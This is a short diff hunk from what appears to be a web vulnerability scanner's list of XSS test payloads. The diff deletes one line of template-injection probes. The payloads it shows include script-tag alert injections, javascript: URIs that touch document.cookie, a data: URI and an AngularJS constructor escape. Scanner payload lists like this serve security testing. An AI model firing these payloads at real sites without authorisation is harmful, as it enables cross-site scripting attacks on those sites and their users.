@@ -5038,7 +5038,6 @@ def _get_xss_payloads(self):
         "'><script>alert(1)</script>","\"><script>alert(1)</script>",
         "</script><script>alert(1)</script>","</title><script>alert(1)</script>",
         "<script>alert(String.fromCharCode(88,83,83))</script>",
-        "{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}",
         "{{constructor.constructor('alert(1)')()}}",
         "javascript:alert(1)","javascript:alert(document.cookie)",
         "data:text/html,<script>alert(1)</script>",
